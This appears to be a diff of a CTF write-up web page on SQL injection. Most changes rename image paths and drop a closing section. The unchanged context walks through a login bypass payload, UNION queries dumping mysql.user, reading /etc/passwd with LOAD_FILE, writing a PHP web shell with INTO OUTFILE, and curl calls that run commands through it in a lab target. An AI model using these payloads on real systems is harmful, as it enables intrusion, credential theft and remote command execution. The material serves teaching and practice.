@@ -47,7 +47,7 @@
         We’re presented with a login panel as our initial attack surface.
       </p>
       <div class="mb-8">
-        <img src="/images/sql1.png" alt="Login panel" class="w-full rounded-lg shadow-md">
+        <img src="/images/SQL1.png" alt="Login panel" class="w-full rounded-lg shadow-md">
       </div>
 
       <h2 class="text-2xl font-semibold mb-4">Step 1: Basic Credential Testing</h2>
@@ -55,7 +55,7 @@
         Let’s begin by testing some basic credentials. Trying <code>admin:admin</code> results in no successful login; now we know the request structure.
       </p>
       <div class="mb-8">
-        <img src="/images/sql2.png" alt="Basic credentials in browser" class="w-full rounded-lg shadow-md">
+        <img src="/images/SQL2.png" alt="Basic credentials in browser" class="w-full rounded-lg shadow-md">
       </div>
 
       <h2 class="text-2xl font-semibold mb-4">Step 2: Capturing the Request in Burp</h2>
@@ -63,7 +63,7 @@
         Capturing the login request in Burp shows a POST request. The <code>username</code> and <code>password</code> fields are clear candidates for SQL injection. We send this to Repeater.
       </p>
       <div class="mb-8">
-        <img src="/images/sql3.png" alt="Burp intercepting login POST" class="w-full rounded-lg shadow-md">
+        <img src="/images/SQL3.png" alt="Burp intercepting login POST" class="w-full rounded-lg shadow-md">
       </div>
 
       <h2 class="text-2xl font-semibold mb-4">Step 3: Testing for SQL Injection</h2>
@@ -71,15 +71,15 @@
         A payload using a single quote, a truthy statement and a comment (<code>' OR 1=1-- -</code>) yields a white screen instead of the failed login message. This suggests the query is evaluated as true.
       </p>
       <div class="mb-8">
-        <img src="/images/sql4.png" alt="White screen after injection" class="w-full rounded-lg shadow-md">
+        <img src="/images/SQL4.png" alt="White screen after injection" class="w-full rounded-lg shadow-md">
       </div>
       <p class="mb-4">We adjust the payload in Burp Repeater:</p>
       <div class="mb-8">
-        <img src="/images/sql5.png" alt="Payload in Burp Repeater" class="w-full rounded-lg shadow-md">
+        <img src="/images/SQL5.png" alt="Payload in Burp Repeater" class="w-full rounded-lg shadow-md">
       </div>
       <p class="mb-4">The payload worked and we are redirected to the dashboard:</p>
       <div class="mb-8">
-        <img src="/images/sql6.png" alt="Dashboard after injection" class="w-full rounded-lg shadow-md">
+        <img src="/images/SQL6.png" alt="Dashboard after injection" class="w-full rounded-lg shadow-md">
       </div>
 
       <h2 class="text-2xl font-semibold mb-4">Step 4: Union-Based Enumeration</h2>
@@ -87,13 +87,13 @@
         We see there are four columns. A UNION injection is likely. Testing a basic UNION payload confirms error output.
       </p>
       <div class="mb-8">
-        <img src="/images/sql7.png" alt="Error from union injection" class="w-full rounded-lg shadow-md">
+        <img src="/images/SQL7.png" alt="Error from union injection" class="w-full rounded-lg shadow-md">
       </div>
       <p class="mb-4">
         Using <code>ORDER BY</code> to enumerate column count:
       </p>
       <div class="mb-8">
-        <img src="/images/sql8.png" alt="Order by test" class="w-full rounded-lg shadow-md">
+        <img src="/images/SQL8.png" alt="Order by test" class="w-full rounded-lg shadow-md">
       </div>
       <p class="mb-4">The <code>ORDER BY 6-- -</code> payload shows no sixth column; there are only five.</p>
 
@@ -106,7 +106,7 @@ UNION SELECT 1, schema_name, 3, 4
 FROM information_schema.schemata-- -
       </pre>
       <div class="mb-8">
-        <img src="/images/sql9.png" alt="List of schemas" class="w-full rounded-lg shadow-md">
+        <img src="/images/SQL9.png" alt="List of schemas" class="w-full rounded-lg shadow-md">
       </div>
       <p class="mb-4">
         Found <code>mysql</code>. List its tables:
@@ -117,7 +117,7 @@ FROM information_schema.tables
 WHERE table_schema='mysql'-- -
       </pre>
       <div class="mb-8">
-        <img src="/images/sql10.png" alt="List of tables in mysql schema" class="w-full rounded-lg shadow-md">
+        <img src="/images/SQL10.png" alt="List of tables in mysql schema" class="w-full rounded-lg shadow-md">
       </div>
 
       <h2 class="text-2xl font-semibold mb-4">Step 6: Exploring User and Host Tables</h2>
@@ -130,7 +130,7 @@ FROM information_schema.columns
 WHERE table_name='host'-- -
       </pre>
       <div class="mb-8">
-        <img src="/images/sql11.png" alt="Host table columns" class="w-full rounded-lg shadow-md">
+        <img src="/images/SQL11.png" alt="Host table columns" class="w-full rounded-lg shadow-md">
       </div>
       <p class="mb-4">
         Inspect the <code>user</code> table for <code>file_priv</code>:
@@ -141,7 +141,7 @@ FROM information_schema.columns
 WHERE table_name='user'-- -
       </pre>
       <div class="mb-8">
-        <img src="/images/sql12.png" alt="User table columns" class="w-full rounded-lg shadow-md">
+        <img src="/images/SQL12.png" alt="User table columns" class="w-full rounded-lg shadow-md">
       </div>
       <p class="mb-4">
         Dump <code>file_priv</code> values:
@@ -151,7 +151,7 @@ UNION SELECT 1, file_priv, 3, 4, 5
 FROM mysql.user-- -
       </pre>
       <div class="mb-8">
-        <img src="/images/sql13.png" alt="File_priv dump" class="w-full rounded-lg shadow-md">
+        <img src="/images/SQL13.png" alt="File_priv dump" class="w-full rounded-lg shadow-md">
       </div>
       <p class="mb-4">
         Dump username and host:
@@ -161,7 +161,7 @@ UNION SELECT 1, user, host, 4, 5
 FROM mysql.user-- -
       </pre>
       <div class="mb-8">
-        <img src="/images/sql14.png" alt="Username and host dump" class="w-full rounded-lg shadow-md">
+        <img src="/images/SQL14.png" alt="Username and host dump" class="w-full rounded-lg shadow-md">
       </div>
       <p class="mb-4">
         Confirm current user:
@@ -170,7 +170,7 @@ FROM mysql.user-- -
 UNION SELECT 1, user(), 3, 4, 5-- -
       </pre>
       <div class="mb-8">
-        <img src="/images/sql15.png" alt="Confirm user() returns root@localhost" class="w-full rounded-lg shadow-md">
+        <img src="/images/SQL15.png" alt="Confirm user() returns root@localhost" class="w-full rounded-lg shadow-md">
       </div>
 
       <h2 class="text-2xl font-semibold mb-4">Step 7: File Access via LOAD_FILE</h2>
@@ -181,7 +181,7 @@ UNION SELECT 1, user(), 3, 4, 5-- -
 UNION SELECT 1, LOAD_FILE('/etc/passwd'), 3, 4, 5-- -
       </pre>
       <div class="mb-8">
-        <img src="/images/sql16.png" alt="passwd contents via LOAD_FILE" class="w-full rounded-lg shadow-md">
+        <img src="/images/SQL16.png" alt="passwd contents via LOAD_FILE" class="w-full rounded-lg shadow-md">
       </div>
 
       <h2 class="text-2xl font-semibold mb-4">Step 8: Writing a PHP Web-Shell</h2>
@@ -193,7 +193,7 @@ UNION SELECT 1, "<?php echo shell_exec($_REQUEST['cmd']); ?>", 3, 4, 5
 INTO OUTFILE '/var/www/html/dashboard/webshell.php'-- -
       </pre>
       <div class="mb-8">
-        <img src="/images/sql17.png" alt="Attempting OUTFILE injection" class="w-full rounded-lg shadow-md">
+        <img src="/images/SQL17.png" alt="Attempting OUTFILE injection" class="w-full rounded-lg shadow-md">
       </div>
 
       <h2 class="text-2xl font-semibold mb-4">Step 9: Verifying Session Cookie</h2>
@@ -201,7 +201,7 @@ INTO OUTFILE '/var/www/html/dashboard/webshell.php'-- -
         Check browser devtools for PHPSESSID:
       </p>
       <div class="mb-8">
-        <img src="/images/sql18.png" alt="Devtools Application Cookies" class="w-full rounded-lg shadow-md">
+        <img src="/images/SQL18.png" alt="Devtools Application Cookies" class="w-full rounded-lg shadow-md">
       </div>
 
       <h2 class="text-2xl font-semibold mb-4">Step 10: Interacting via cURL</h2>
@@ -213,7 +213,7 @@ curl -H "Cookie: session=e5afpn4e1q44plgaap1p06180vh" \
   "http://94.237.54.192:51501/dashboard/webshell.php?cmd=ls+-a+${HOME:0:1}"
       </pre>
       <div class="mb-8">
-        <img src="/images/sql19.png" alt="cURL listing directories" class="w-full rounded-lg shadow-md">
+        <img src="/images/SQL19.png" alt="cURL listing directories" class="w-full rounded-lg shadow-md">
       </div>
       <p class="mb-4">
         Read the flag:
@@ -223,27 +223,8 @@ curl -H "Cookie: session=e5afpn4e1q44plgaap1p06180vh" \
   "http://94.237.54.192:51501/dashboard/webshell.php?cmd=cat+${HOME:0:1}flag_cae1dadcd174.txt"
       </pre>
       <div class="mb-8">
-        <img src="/images/sql20.png" alt="cURL reading flag file" class="w-full rounded-lg shadow-md">
+        <img src="/images/SQL20.png" alt="cURL reading flag file" class="w-full rounded-lg shadow-md">
       </div>
-
-      <h2 class="text-2xl font-semibold mb-4">Challenge One (Introduction)</h2>
-      <p class="mb-4">
-        Once on the dashboard, I was presented with the following:
-      </p>
-      <div class="mb-8">
-        <img src="/images/sql21.png" alt="First challenge image" class="w-full rounded-lg shadow-md">
-      </div>
-      <p class="mb-4">
-        I downloaded the image and tried every steganographic method; nothing worked. The next day I hit <code>CTRL A</code> and discovered a hidden symbol above the photo:
-      </p>
-      <div class="mb-8">
-        <img src="/images/sql22.png" alt="Hidden symbol revealed" class="w-full rounded-lg shadow-md">
-      </div>
-
-      <div class="mt-12">
-        <a href="/CTF/" class="text-blue-600 hover:underline">&larr; Back to all CTFs</a>
-      </div>
-
     </article>
   </main>
 </body>
